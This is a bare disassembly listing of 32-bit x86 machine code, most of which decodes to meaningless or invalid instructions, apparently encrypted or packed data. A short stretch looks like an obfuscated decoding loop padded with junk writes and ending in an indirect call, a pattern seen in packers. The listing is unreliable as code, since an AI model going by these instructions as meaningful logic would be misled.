  405804:	mov    ebx,0x38a679a5
  405809:	mov    DWORD PTR [edi],ecx
  40580b:	lock or DWORD PTR gs:[eax-0x287514a8],edx
  405813:	fimul  DWORD PTR [edi]
  405815:	adc    DWORD PTR [ebp-0x2b4fdac7],0x2f
  40581c:	pusha  
  40581d:	add    al,0x69
  40581f:	(bad)  
  405820:	fnstenv [edi+0x3]
  405823:	punpcklwd mm7,DWORD PTR [ecx]
  405826:	mov    esp,DWORD PTR [si]
  405829:	mov    ch,0xc1
  40582b:	push   ebp
  40582c:	ret    0x166b
  40582f:	push   ss
  405830:	jmp    0x4057de
  405832:	mov    DWORD PTR [esi+esi*2-0x41],eax
  405836:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405837:	retf   
  405838:	data16 stos BYTE PTR es:[edi],al
  40583a:	mov    ds:0x85c6e074,eax
  40583f:	pop    es
  405840:	ret    0x8a9
  405843:	mov    ebx,0xf5bf87b7
  405848:	into   
  405849:	fmul   QWORD PTR [ecx-0x1e95ead0]
  40584f:	jb     0x4058d0
  405851:	jns    0x40584a
  405853:	mov    cl,0xef
  405855:	call   DWORD PTR [ebp+eiz*4-0x5fe72d81]
  40585c:	aad    0x9
  40585e:	jns    0x4058b4
  405860:	loope  0x40584c
  405862:	mov    cl,0x2b
  405864:	cmp    ecx,edx
  405866:	push   ss
  405867:	stc    
  405868:	push   cs
  405869:	dec    esp
  40586a:	jbe    0x4058df
  40586c:	out    0xc2,al
  40586e:	and    eax,0xf1ad3a7
  405873:	or     BYTE PTR [esi+0x5eb0342d],cl
  405879:	pop    ss
  40587a:	stc    
  40587b:	scas   eax,DWORD PTR es:[edi]
  40587c:	add    DWORD PTR [edx],edx
  40587e:	ret    0xb4ef
  405881:	cmp    DWORD PTR gs:[ebp+0x1],edi
  405885:	scas   eax,DWORD PTR es:[edi]
  405886:	add    edx,edi
  405888:	call   0x4d5b:0xf8e6ceab
  40588f:	std    
  405890:	sar    BYTE PTR [esi+ebp*2+0x34439276],1
  405897:	jns    0x4058dc
  405899:	mov    eax,ds:0x1c9a4dcc
  40589e:	in     eax,0x4b
  4058a0:	mov    al,0x7e
  4058a2:	push   edx
  4058a3:	mov    dl,0x7c
  4058a5:	add    bl,BYTE PTR [ecx+0x40]
  4058a8:	cmc    
  4058a9:	push   eax
  4058aa:	arpl   WORD PTR [ecx],si
  4058ac:	xor    eax,DWORD PTR [ecx+0x78]
  4058af:	add    ebx,DWORD PTR [ecx+0x144fd899]
  4058b5:	lds    ebx,FWORD PTR [edi+0x5d]
  4058b8:	idiv   BYTE PTR [edx]
  4058ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4058bb:	fsub   DWORD PTR [edi+0x5e]
  4058be:	xchg   esp,eax
  4058bf:	fadd   DWORD PTR [ecx]
  4058c1:	jmp    0x3fc6d345
  4058c6:	xor    dh,al
  4058c8:	mov    ebp,ebp
  4058ca:	aam    0x72
  4058cc:	or     dl,ah
  4058ce:	jbe    0x40588c
  4058d0:	mov    WORD PTR [edi+ecx*2-0x106458b],?
  4058d7:	popf   
  4058d8:	fiadd  DWORD PTR [eax+eax*8+0x1d]
  4058dc:	scas   eax,DWORD PTR es:[edi]
  4058dd:	hlt    
  4058de:	outs   dx,BYTE PTR ds:[esi]
  4058df:	(bad)  
  4058e1:	stos   DWORD PTR es:[edi],eax
  4058e2:	test   BYTE PTR [ebx],0x3c
  4058e5:	lds    edi,FWORD PTR [edi+edx*1+0x5c9c1ef4]
  4058ec:	int3   
  4058ed:	ja     0x405927
  4058ef:	jnp    0x4058b0
  4058f1:	in     eax,0x2d
  4058f3:	data16 ss ss jae 0x40587a
  4058f8:	out    dx,eax
  4058f9:	jge    0x4058a2
  4058fb:	sub    ch,bh
  4058fd:	stos   BYTE PTR es:[edi],al
  4058fe:	repnz cmp dl,BYTE PTR [ecx-0x342c5afe]
  405905:	and    al,BYTE PTR [ecx+0x46]
  405908:	das    
  405909:	repnz repz cs and al,0x76
  40590e:	jne    0x4058c6
  405910:	dec    edi
  405911:	ins    DWORD PTR es:[edi],dx
  405912:	add    cl,BYTE PTR [ecx+0x295bebf8]
  405918:	sub    esp,DWORD PTR [edx-0x1e8829a8]
  40591e:	add    BYTE PTR [edi+0x3f],ah
  405921:	mov    al,0xd6
  405923:	nop
  405924:	into   
  405925:	out    0x16,al
  405927:	lock mov cl,BYTE PTR [ecx+0x4d]
  40592b:	dec    esp
  40592c:	pop    ss
  40592d:	aad    0x58
  40592f:	fbld   TBYTE PTR [esp+esi*8]
  405932:	sbb    DWORD PTR [eax],edx
  405934:	mov    ebp,0x5da928e3
  405939:	stos   BYTE PTR es:[edi],al
  40593a:	push   esp
  40593b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40593c:	push   0x8d4d6612
  405941:	je     0x4059bd
  405943:	cmp    eax,0x2ffc7607
  405948:	cmp    eax,0x3a19f060
  40594d:	dec    ebx
  40594e:	add    eax,0xa54b9230
  405953:	cdq    
  405954:	push   0xb1ec6ee5
  405959:	leave  
  40595a:	pop    ebx
  40595b:	inc    eax
  40595c:	adc    al,0x6c
  40595e:	mov    edi,0xfb9c804
  405963:	into   
  405964:	sbb    al,0x64
  405966:	mov    edx,0xbdd38c90
  40596b:	std    
  40596c:	(bad)  
  40596e:	ret    
  40596f:	xor    edx,DWORD PTR [esi-0x62]
  405972:	push   ds
  405973:	std    
  405974:	pusha  
  405975:	mov    ch,0x12
  405977:	ret    
  405978:	add    dl,BYTE PTR [esi-0x44]
  40597b:	mov    bl,0x88
  40597d:	outs   dx,BYTE PTR ds:[esi]
  40597e:	add    DWORD PTR [ecx+0x6e],ecx
  405981:	dec    ebp
  405982:	pop    eax
  405983:	xor    BYTE PTR [esi+0x1b93cc5d],0xf4
  40598a:	mov    ebp,0x6ae2dc67
  40598f:	lods   eax,DWORD PTR ds:[esi]
  405990:	push   eax
  405991:	adc    cl,BYTE PTR [edx]
  405993:	addr16 sti 
  405995:	mov    ebp,0xdd59ae82
  40599a:	pusha  
  40599b:	int3   
  40599c:	mov    BYTE PTR [esi],ch
  40599e:	scas   al,BYTE PTR es:[edi]
  40599f:	aad    0x1b
  4059a1:	cs push ebx
  4059a3:	xchg   dh,dh
  4059a5:	ja     0x4059ae
  4059a7:	push   esi
  4059a8:	xor    al,0x93
  4059aa:	add    BYTE PTR [edx],al
  4059ac:	xor    ebx,DWORD PTR [ecx-0x3131355a]
  4059b2:	test   al,0x2f
  4059b4:	bound  ebx,QWORD PTR [edi+0x37]
  4059b7:	jg     0x405a0c
  4059b9:	outs   dx,BYTE PTR ds:[esi]
  4059ba:	and    edx,DWORD PTR [ebx+eax*1+0x101f980e]
  4059c1:	arpl   cx,cx
  4059c3:	aam    0xc
  4059c5:	lods   al,BYTE PTR ds:[esi]
  4059c6:	jo     0x405982
  4059c8:	imul   ebp,DWORD PTR [esi],0xffffffbd
  4059cb:	push   edi
  4059cc:	jo     0x4059e6
  4059ce:	xchg   ebx,eax
  4059cf:	and    BYTE PTR [ecx-0x110d57ea],dh
  4059d5:	and    edi,DWORD PTR ds:0x5ced76ed
  4059db:	cdq    
  4059dc:	or     bh,cl
  4059de:	and    ebp,DWORD PTR [edi+0x1a]
  4059e1:	sbb    ebx,ebp
  4059e3:	arpl   bp,bp
  4059e5:	jecxz  0x4059bb
  4059e7:	cmp    dl,bl
  4059e9:	fsub   QWORD PTR [edx]
  4059eb:	pop    esp
  4059ec:	lea    eax,[esi+0x67ba4312]
  4059f2:	adc    esi,DWORD PTR [edx]
  4059f4:	xchg   DWORD PTR [eax+0x26d84c37],edi
  4059fa:	xlat   BYTE PTR ds:[ebx]
  4059fb:	out    0x3,al
  4059fd:	dec    eax
  4059fe:	(bad)
  405a01:	sar    BYTE PTR [ebx+edi*1+0x63090570],0x11
  405a09:	stos   DWORD PTR es:[edi],eax
  405a0a:	test   al,0x4d
  405a0c:	push   ebp
  405a0d:	push   0x19
  405a0f:	pop    es
  405a10:	stos   DWORD PTR es:[edi],eax
  405a11:	test   eax,0x5ec385f3
  405a16:	dec    esi
  405a17:	xchg   esp,eax
  405a18:	sbb    DWORD PTR [ecx],edx
  405a1a:	push   ecx
  405a1b:	and    DWORD PTR [esi-0x74],edx
  405a1e:	out    0xac,al
  405a20:	call   0x603c2df
  405a25:	retf   0x36ca
  405a28:	pop    eax
  405a29:	mov    ds,WORD PTR [edi]
  405a2b:	pop    es
  405a2c:	ins    BYTE PTR es:[edi],dx
  405a2d:	cmc    
  405a2e:	and    eax,0xeb444f1f
  405a33:	leave  
  405a34:	cmp    ch,cl
  405a36:	mov    edi,0xf3300478
  405a3b:	xor    DWORD PTR [edx-0x7d],ebx
  405a3e:	mov    ah,0x68
  405a40:	push   esp
  405a41:	push   ebx
  405a42:	bound  ebp,QWORD PTR [edi+0x46abbff4]
  405a48:	push   0x13850fd1
  405a4d:	xor    al,0xf7
  405a4f:	and    eax,0x99a78583
  405a54:	data16 mov BYTE PTR [esi],dh
  405a57:	(bad)  
  405a58:	push   0xbb1a1144
  405a5d:	and    BYTE PTR [eax+ebp*2-0x3d],dl
  405a61:	es cdq 
  405a63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a64:	or     al,BYTE PTR [esi+0x4]
  405a67:	bound  ebp,QWORD PTR [ecx+ecx*1+0x3109090]
  405a6e:	fidivr WORD PTR [edi]
  405a70:	xor    BYTE PTR [edi+0xadeb74d],bl
  405a76:	mov    eax,0xe1acf4ae
  405a7b:	aam    0x7c
  405a7d:	dec    ebp
  405a7e:	jns    0x405ad5
  405a80:	icebp  
  405a81:	mov    ds:0x2d4eb76,eax
  405a86:	adc    eax,0x87e81798
  405a8b:	jp     0x405a66
  405a8d:	shl    al,cl
  405a8f:	dec    ebp
  405a90:	into   
  405a91:	inc    ecx
  405a92:	pusha  
  405a93:	xor    BYTE PTR [esi+0x69eb0775],bh
  405a99:	fsub   DWORD PTR [esi]
  405a9b:	popf   
  405a9c:	add    esp,ebx
  405a9e:	jmp    0x3ee69f29
  405aa3:	cli    
  405aa4:	movnti DWORD PTR [esi-0x4d],edx
  405aa8:	xchg   edi,eax
  405aa9:	mov    ds:0xa0bce0d0,eax
  405aae:	mov    WORD PTR [ebx+0x5f2fcf61],cs
  405ab4:	call   0xf464d76b
  405ab9:	mov    ebx,0x24fc8a98
  405abe:	test   eax,0xa0e53d2a
  405ac3:	cmp    eax,0x56c4a9d3
  405ac8:	das    
  405ac9:	mov    ebx,0x620ce37
  405ace:	xor    al,0xa5
  405ad0:	in     eax,0x8d
  405ad2:	sahf   
  405ad3:	and    BYTE PTR [edx-0x7a],bl
  405ad6:	jmp    0xa79a2dc1
  405adb:	mov    bh,0xc3
  405add:	pop    ds
  405ade:	sub    bl,BYTE PTR [edi+0x33b1e7d7]
  405ae4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ae5:	iret   
  405ae6:	test   eax,0x140232e5
  405aeb:	push   esi
  405aec:	idiv   BYTE PTR [eax-0x490a42b6]
  405af2:	call   0x456c3df
  405af7:	fistp  QWORD PTR [ecx]
  405af9:	and    ch,dh
  405afb:	sub    al,0xe4
  405afd:	stc    
  405afe:	call   0x310d98bb
  405b03:	mov    cl,0x7b
  405b05:	aad    0x9a
  405b07:	mov    al,ds:0x17a8f0e6
  405b0c:	pop    esp
  405b0d:	mov    ebx,0xb96c9917
  405b12:	dec    edx
  405b13:	and    DWORD PTR [esi+0x2f],ebp
  405b16:	in     al,dx
  405b17:	imul   edi,DWORD PTR ds:[edi+0x46],0xffffffe7
  405b1c:	fs das 
  405b1e:	inc    ecx
  405b1f:	push   cs
  405b20:	ins    DWORD PTR es:[edi],dx
  405b21:	xor    DWORD PTR ds:0x38530784,ebx
  405b27:	adc    DWORD PTR [edx-0x60],ebp
  405b2a:	popa   
  405b2b:	out    dx,eax
  405b2c:	adc    BYTE PTR [esi+0x28],ch
  405b2f:	fiadd  DWORD PTR [edi+0x4]
  405b32:	test   al,0x1a
  405b34:	sbb    bl,bl
  405b36:	lock (bad) 
  405b38:	pop    ds
  405b39:	call   0x88a3:0x8e4045d6
  405b40:	dec    ebp
  405b41:	mov    esi,0xd4e7d10d
  405b46:	xor    BYTE PTR [eax],0xb9
  405b49:	cmp    eax,0xfb446e48
  405b4e:	outs   dx,BYTE PTR ds:[esi]
  405b4f:	mov    eax,ds:0xe23a28a1
  405b54:	sti    
  405b55:	jb     0x405bb2
  405b57:	test   al,0x45
  405b59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b5a:	push   ecx
  405b5b:	push   es
  405b5c:	mov    cl,0x1
  405b5e:	ins    BYTE PTR es:[edi],dx
  405b5f:	mov    WORD PTR [ebx],es
  405b61:	sub    BYTE PTR [ebx],0xa7
  405b64:	(bad)  
  405b65:	idiv   al
  405b67:	xor    al,0x73
  405b69:	das    
  405b6a:	push   esi
  405b6b:	addr16 adc al,0x1
  405b6e:	addr16 call 0x622:0x97298d13
  405b76:	ins    BYTE PTR es:[edi],dx
  405b77:	sub    edi,eax
  405b79:	push   ebp
  405b7a:	pop    ecx
  405b7b:	sbb    dh,BYTE PTR [edi+0x2e]
  405b7e:	daa    
  405b7f:	xchg   BYTE PTR ds:[ebx+ebp*8-0x6fec0c35],ah
  405b87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b88:	stos   DWORD PTR es:[edi],eax
  405b89:	pushf  
  405b8a:	xchg   DWORD PTR [eax-0x4ad1a82d],eax
  405b90:	in     al,0xc9
  405b92:	int3   
  405b93:	xchg   edx,eax
  405b94:	jmp    0xfe71:0x52525920
  405b9b:	pushf  
  405b9c:	mov    esi,DWORD PTR [edx]
  405b9e:	ret    
  405b9f:	imul   DWORD PTR [ecx]
  405ba1:	push   edi
  405ba2:	jo     0x405ba7
  405ba4:	jne    0x405b2c
  405ba6:	pop    ebp
  405ba7:	push   ds
  405ba8:	jb     0x405c10
  405baa:	push   ebx
  405bab:	mov    ecx,0xc3d066b2
  405bb0:	xor    ch,dl
  405bb2:	scas   eax,DWORD PTR es:[edi]
  405bb3:	fwait
  405bb4:	loop   0x405c2c
  405bb6:	leave  
  405bb7:	xor    edi,esp
  405bb9:	pop    edi
  405bba:	ss stos BYTE PTR es:[edi],al
  405bbc:	(bad)  
  405bbd:	into   
  405bbe:	xchg   BYTE PTR [esi],bl
  405bc0:	and    eax,0x4b09ff0a
  405bc5:	(bad)  
  405bc6:	cmp    DWORD PTR [edi-0x2edd1456],ebx
  405bcc:	fimul  DWORD PTR [edx+ebp*4]
  405bcf:	push   cs
  405bd0:	push   ebx
  405bd1:	(bad)  
  405bd2:	cld    
  405bd3:	mov    al,0xc0
  405bd5:	adc    DWORD PTR [edx+0x3d],0x352f72d9
  405bdc:	loope  0x405bf1
  405bde:	pushf  
  405bdf:	jo     0x405c12
  405be1:	pop    edi
  405be2:	(bad)  
  405be3:	mov    ds:0x162b0be,eax
  405be8:	jno    0x405baa
  405bea:	xchg   edi,eax
  405beb:	daa    
  405bec:	and    al,0xe
  405bee:	ds out dx,eax
  405bf0:	and    DWORD PTR [ebx+0x30],edx
  405bf3:	or     dh,ah
  405bf5:	aam    0x5f
  405bf7:	inc    ebx
  405bf8:	(bad)  
  405bfa:	pop    edx
  405bfb:	cmp    ah,BYTE PTR [esi+0x40440adb]
  405c01:	jecxz  0x405bd6
  405c03:	jmp    0xa6ac40e0
  405c08:	push   cs
  405c09:	out    dx,eax
  405c0a:	imul   edx,DWORD PTR [edx+0x597c5287],0x3c
  405c11:	xchg   DWORD PTR [esi],esi
  405c13:	addr16 push ecx
  405c15:	pop    esi
  405c16:	cmp    DWORD PTR [ebp+0x33],esp
  405c19:	fnsave [ebx-0x1e]
  405c1c:	and    BYTE PTR [esi+0xee4b611],cl
  405c22:	or     al,0x9f
  405c24:	cmp    DWORD PTR [ecx+0x3d],edx
  405c27:	adc    ecx,DWORD PTR [edi+0x3a0ffdf3]
  405c2d:	dec    edi
  405c2e:	mov    al,0xb
  405c30:	and    ch,BYTE PTR [edx]
  405c32:	dec    eax
  405c33:	mov    ebx,0xf46124eb
  405c38:	dec    edi
  405c39:	aad    0x3a
  405c3b:	call   0x8258:0x47c8e3c9
  405c42:	mov    ecx,0xfa5260f4
  405c47:	dec    ecx
  405c48:	jg     0x405c80
  405c4a:	retf   0xc284
  405c4d:	inc    esi
  405c4e:	and    al,bh
  405c50:	inc    DWORD PTR [ebx-0xfdf0f29]
  405c56:	data16 sub al,al
  405c59:	push   eax
  405c5a:	mov    ebx,ds
  405c5c:	in     al,dx
  405c5d:	pushf  
  405c5e:	pop    edi
  405c5f:	sbb    cl,BYTE PTR [esi-0x2]
  405c62:	jae    0x405cb1
  405c64:	or     dl,BYTE PTR [ecx+0x1f]
  405c67:	sar    DWORD PTR [edi],cl
  405c69:	cmp    ebp,edi
  405c6b:	add    dl,BYTE PTR [ebx+0x443335a2]
  405c71:	and    dh,al
  405c73:	pop    edx
  405c74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c75:	sub    ebx,DWORD PTR [edi]
  405c77:	or     BYTE PTR [eax-0x47772905],bl
  405c7d:	icebp  
  405c7e:	inc    esi
  405c7f:	arpl   cx,ax
  405c81:	ret    
  405c82:	sub    al,0xe1
  405c84:	push   edi
  405c85:	lea    esp,[eax]
  405c87:	jge    0x405c48
  405c89:	mov    eax,ds:0x8ac0f801
  405c8e:	dec    ecx
  405c8f:	jne    0x405c74
  405c91:	ror    DWORD PTR [ebx],1
  405c93:	cwde   
  405c94:	mov    esi,?
  405c96:	dec    esi
  405c97:	mov    al,ds:0xccc97e72
  405c9c:	xor    BYTE PTR [esi],dl
  405c9e:	out    0x3b,eax
  405ca0:	push   esi
  405ca1:	sbb    ecx,DWORD PTR [edx]
  405ca3:	push   ss
  405ca4:	jne    0x405c30
  405ca6:	sbb    al,0x59
  405ca8:	in     eax,dx
  405ca9:	sub    esp,esi
  405cab:	ins    BYTE PTR es:[edi],dx
  405cac:	test   eax,0x60cada65
  405cb1:	lods   al,BYTE PTR ds:[esi]
  405cb2:	mov    ds,WORD PTR [edx]
  405cb4:	inc    ecx
  405cb5:	into   
  405cb6:	dec    BYTE PTR [eax+edi*2+0x52]
  405cba:	fwait
  405cbb:	dec    esi
  405cbc:	pop    edi
  405cbd:	or     cl,BYTE PTR [ebx-0x14bf693d]
  405cc3:	cwde   
  405cc4:	jne    0x405c82
  405cc6:	cmp    DWORD PTR [esi],esp
  405cc8:	pop    edx
  405cc9:	push   esi
  405cca:	pop    ebx
  405ccb:	mov    ebx,esp
  405ccd:	int    0x7a
  405ccf:	xor    BYTE PTR ds:0x73e6950,al
  405cd5:	jecxz  0x405ced
  405cd7:	scas   al,BYTE PTR es:[edi]
  405cd8:	sti    
  405cd9:	mov    edx,0x3f8f9ea7
  405cde:	enter  0x8c32,0xd4
  405ce2:	aam    0x9e
  405ce4:	lea    ebx,[edi]
  405ce6:	pop    ds
  405ce7:	sbb    al,0x37
  405ce9:	sbb    al,0xfe
  405ceb:	in     eax,0x65
  405ced:	mov    ah,0xdc
  405cef:	dec    edi
  405cf0:	add    ecx,DWORD PTR [edx+0x66]
  405cf3:	cmp    BYTE PTR [ecx],ch
  405cf5:	adc    edx,ebp
  405cf7:	inc    esp
  405cf8:	mov    al,ds:0x99580b07
  405cfd:	aam    0x1c
  405cff:	inc    esp
  405d00:	sbb    DWORD PTR [ecx],esp
  405d02:	sub    cl,BYTE PTR [esp+eax*2+0x32]
  405d06:	mov    ebp,0xd7e32b58
  405d0b:	das    
  405d0c:	jle    0x405d3c
  405d0e:	loop   0x405d7f
  405d10:	jb     0x405cd0
  405d12:	jo     0x405d7a
  405d14:	sub    BYTE PTR [edx-0x347ec9a6],ah
  405d1a:	out    0x3c,eax
  405d1c:	xor    eax,0x297db532
  405d21:	loop   0x405d58
  405d23:	or     eax,0x3d1fda0
  405d28:	sub    al,0x5a
  405d2a:	or     DWORD PTR [eax+0x38],edx
  405d2d:	mov    bh,0xd3
  405d2f:	mov    dh,0xf6
  405d31:	hlt    
  405d32:	push   0xdc3a3816
  405d37:	(bad)  [ecx-0x48ca8d8b]
  405d3d:	dec    eax
  405d3e:	repz lahf 
  405d40:	mov    eax,ds:0x33fd304c
  405d45:	ror    BYTE PTR [edx-0x7427ba75],0x4d
  405d4c:	call   0xa31a7348
  405d51:	inc    edx
  405d52:	add    BYTE PTR [ebx],dh
  405d54:	mov    BYTE PTR [ecx+0x42a2fa0d],0x0
  405d5b:	dec    edi
  405d5c:	or     al,BYTE PTR [eax]
  405d5e:	add    BYTE PTR [ebx],dh
  405d60:	into   
  405d61:	or     DWORD PTR ds:0x42a26a,0x42a2f6
  405d6b:	add    eax,edi
  405d6d:	add    ecx,edi
  405d6f:	mov    BYTE PTR [ebp-0x21],dl
  405d72:	cmp    eax,ecx
  405d74:	jae    0x408235
  405d7a:	add    edx,DWORD PTR ds:0x42a2a2
  405d80:	lea    ecx,[eax-0x3272f1]
  405d86:	mov    DWORD PTR [ebp-0x14],ecx
  405d89:	sub    DWORD PTR ds:0x42a27a,0x2374
  405d93:	mov    edx,DWORD PTR [ebp-0x14]
  405d96:	add    DWORD PTR ds:0x42a2a2,0x6412
  405da0:	xor    edx,esi
  405da2:	add    edx,0x7f55d8fb
  405da8:	lea    ecx,[ebp+eax*4-0xb4]
  405daf:	mov    DWORD PTR ds:0x42a25a,0x798e
  405db9:	mov    DWORD PTR [ecx],edx
  405dbb:	mov    edx,0x1097
  405dc0:	mov    edx,DWORD PTR [ecx]
  405dc2:	cmp    edx,0x244ecb98
  405dc8:	jbe    0x405de3
  405dce:	xor    DWORD PTR ds:0x42a29a,0x42a2d6
  405dd8:	add    DWORD PTR [ecx],0x405fcd9
  405dde:	jmp    0x405de9
  405de3:	add    DWORD PTR [ecx],0xfdaf4327
  405de9:	or     DWORD PTR ds:0x42a2f6,edi
  405def:	mov    ecx,DWORD PTR [ebp-0x18]
  405df2:	xor    ecx,esi
  405df4:	and    DWORD PTR ds:0x42a25e,0x42a27a
  405dfe:	inc    eax
  405dff:	and    DWORD PTR ds:0x42a2aa,0x42a2a6
  405e09:	inc    DWORD PTR [ebp-0x14]
  405e0c:	add    ecx,edi
  405e0e:	mov    DWORD PTR ds:0x42a2f6,0x14dc
  405e18:	cmp    eax,ecx
  405e1a:	mov    DWORD PTR ds:0x42a2fe,0x33af
  405e24:	jb     0x405d89
  405e2a:	and    DWORD PTR ds:0x42a25e,0x0
  405e34:	mov    eax,ds:0x42a25e
  405e39:	inc    eax
  405e3a:	mov    ds:0x42a25e,eax
  405e3f:	cmp    DWORD PTR ds:0x42a25e,0x1c
  405e46:	jge    0x405e81
  405e4c:	jmp    0x405e74
  405e51:	push   0x42a28e
  405e56:	push   0x8ee8
  405e5b:	push   DWORD PTR [ebp-0xc]
  405e5e:	push   0x2324
  405e63:	push   0x4718
  405e68:	push   DWORD PTR [ebp-0x20]
  405e6b:	push   DWORD PTR [ebp-0x18]
  405e6e:	call   DWORD PTR ds:0x42a3ce
  405e74:	cmp    DWORD PTR ds:0x42a25e,0x18
  405e7b:	jb     0x405e34
  405e81:	mov    dl,BYTE PTR [ebp-0x21]
  405e84:	jmp    0x408235
  405e89:	test   eax,0xe897f33e
  405e8e:	add    BYTE PTR [ecx-0x2fc9eefa],0xf5
  405e95:	dec    edx
  405e96:	mov    eax,ds:0x3a5bb9fe
  405e9b:	add    DWORD PTR [ebx-0x7c7ca111],0xffffffef
  405ea2:	call   0x4c35727b
  405ea7:	pop    ecx
  405ea8:	imul   DWORD PTR [ecx-0x4ee42335]
  405eae:	jns    0x405e54
  405eb0:	jae    0x405e50
  405eb2:	es out dx,al
  405eb4:	dec    edx
  405eb5:	jle    0x405e93
  405eb7:	in     eax,0xe
  405eb9:	test   DWORD PTR [bx],0x40402dfa
  405ec0:	shl    DWORD PTR [eax-0xa299ca8],cl
  405ec6:	mov    dl,0x94
  405ec8:	sbb    al,0xe0
  405eca:	test   BYTE PTR ds:[ebx-0x4c],cl
  405ece:	pusha  
  405ecf:	push   0xffffff96
  405ed1:	sar    DWORD PTR [eax+ebx*4],cl
  405ed4:	sahf   
  405ed5:	mov    BYTE PTR [ecx+0x1],cl
  405ed8:	(bad)  
  405ed9:	jbe    0x405eaf
  405edb:	das    
  405edc:	jbe    0x405e72
  405ede:	imul   ebp,DWORD PTR [edx],0xffffffc9
  405ee1:	sbb    DWORD PTR [edi],ebp
  405ee3:	(bad)  
  405ee4:	into   
  405ee5:	pop    esp
  405ee6:	push   ebp
  405ee7:	dec    esi
  405ee8:	shl    dh,0x11
  405eeb:	xchg   esi,eax
  405eec:	and    al,0x5b
  405eee:	scas   eax,DWORD PTR es:[edi]
  405eef:	jbe    0x405efd
  405ef1:	mov    ebx,0xe48820d4
  405ef6:	mov    eax,ds:0xf45be2f8
  405efb:	es iret 
  405efd:	mov    esp,0x10b9dd7
  405f02:	mul    BYTE PTR [edx+0x1886b68f]
  405f08:	add    al,0xc4
  405f0a:	adc    eax,0xe435d14
  405f0f:	loope  0x405f09
  405f11:	sbb    DWORD PTR [esi],esi
  405f13:	lahf   
  405f14:	rcr    al,1
  405f16:	jg     0x405ecf
  405f18:	add    ebx,DWORD PTR [ebp+ecx*8-0x7a53e055]
  405f1f:	sahf   
  405f20:	add    DWORD PTR [esi+edi*1],edi
  405f23:	std    
  405f24:	std    
  405f25:	mov    ah,0xd8
  405f27:	dec    edx
  405f28:	cmp    DWORD PTR [esi+0x1f0d4306],0xef464a14
  405f32:	in     eax,dx
  405f33:	(bad)  
  405f34:	stc    
  405f35:	mov    esp,0xf4ebd71
  405f3a:	adc    eax,0xb5d2f986
  405f3f:	sub    DWORD PTR [eax+0x2b890c69],ecx
  405f45:	and    ch,cl
  405f47:	push   0xaed2af05
  405f4c:	fwait
  405f4d:	mov    edx,0x6be58b46
  405f52:	arpl   WORD PTR [edi-0x3d],si
  405f55:	add    edx,DWORD PTR [ebx+0x47]
  405f58:	pop    esp
  405f59:	cs pop esp
  405f5b:	mov    edi,0x2c86f9f7
  405f60:	(bad)  [ebx]
  405f62:	dec    ecx
  405f63:	mov    ch,0xe1
  405f65:	add    eax,0x5b5b1542
  405f6a:	push   edx
  405f6b:	rcl    BYTE PTR [ecx],0x95
  405f6e:	xchg   ebx,eax
  405f6f:	call   0x8b1ef694
  405f74:	and    eax,ecx
  405f76:	test   DWORD PTR [edx+0x39e3a41c],eax
  405f7c:	sbb    BYTE PTR [edx+edx*2-0x4b],dh
  405f80:	mov    esi,0xd14d8fd9
  405f85:	ja     0x405ff2
  405f87:	dec    edi
  405f88:	outs   dx,BYTE PTR ds:[esi]
  405f89:	mov    ecx,0xc9c09977
  405f8e:	xchg   ecx,eax
  405f8f:	pushf  
  405f90:	popf   
  405f91:	lock sti 
  405f93:	(bad)  
  405f94:	ror    BYTE PTR [esi+ebp*1],1
  405f97:	ror    edx,1
  405f99:	cmc    
  405f9a:	dec    esp
  405f9b:	inc    edx
  405f9c:	jg     0x405f6e
  405f9e:	pop    ebx
  405f9f:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  405fa1:	mov    eax,ds:0x8ecf6f79
  405fa6:	sub    ebx,edx
  405fa8:	pusha  
  405fa9:	mov    BYTE PTR [ecx],0x40
  405fac:	ins    BYTE PTR es:[edi],dx
  405fad:	or     eax,0xa91667d6
  405fb2:	cmp    eax,0x67c1be0b
  405fb7:	xchg   edx,eax
  405fb8:	pop    ebx
  405fb9:	out    dx,al
  405fba:	out    0xb7,al
  405fbc:	sub    DWORD PTR [eax+0x1c],eax
  405fbf:	fistp  WORD PTR [ebx-0x6f]
  405fc2:	mov    al,ds:0xaf152bad
  405fc7:	add    eax,0xa914feb4
  405fcc:	shl    DWORD PTR [esi],0x4
  405fcf:	push   esi
  405fd0:	mov    ah,0x91
  405fd2:	add    BYTE PTR [ebx+0x75bf2ec8],al
  405fd8:	iret   
  405fd9:	push   ebx
  405fda:	(bad)  
  405fdb:	imul   ebp,DWORD PTR [bp+0x56a8],0xffffffa3
  405fe1:	daa    
  405fe2:	inc    ebp
  405fe3:	mov    ecx,eax
  405fe5:	dec    ecx
  405fe6:	xchg   ebx,eax
  405fe7:	adc    edi,edx
  405fe9:	add    ebx,DWORD PTR [ecx-0x602f00c3]
  405fef:	aad    0x67
  405ff1:	dec    esp
  405ff2:	ins    DWORD PTR es:[edi],dx
  405ff3:	rol    BYTE PTR [esi],0xe4
  405ff6:	imul   esi,DWORD PTR [eax],0xffffffda
  405ff9:	mov    dh,0x93
  405ffb:	ret    0x1f3d
  405ffe:	ds jle 0x40602d
  406001:	lds    edx,FWORD PTR [ecx]
  406003:	pop    ebp
  406004:	lea    esp,[ebp-0x2f]
  406007:	sbb    eax,0xf3a572ac
  40600c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40600d:	mov    dl,0x71
  40600f:	ins    BYTE PTR es:[edi],dx
  406010:	inc    ebp
  406011:	out    dx,eax
  406012:	pusha  
  406013:	dec    bl
  406015:	or     al,BYTE PTR ds:0x884ef438
  40601b:	mov    eax,0x55e8554c
  406020:	push   esp
  406021:	es push es
  406023:	pop    es
  406024:	or     bh,dl
  406026:	xlat   BYTE PTR ds:[ebx]
  406027:	pop    ebx
  406028:	jmp    0x789bd2ff
  40602d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40602e:	jnp    0x405fb1
  406030:	stos   DWORD PTR es:[edi],eax
  406031:	and    BYTE PTR [edx-0x47],bl
  406034:	push   es
  406035:	xchg   esp,eax
  406036:	mov    edi,0xa806bf82
  40603b:	cmp    BYTE PTR [esp+eax*2],al
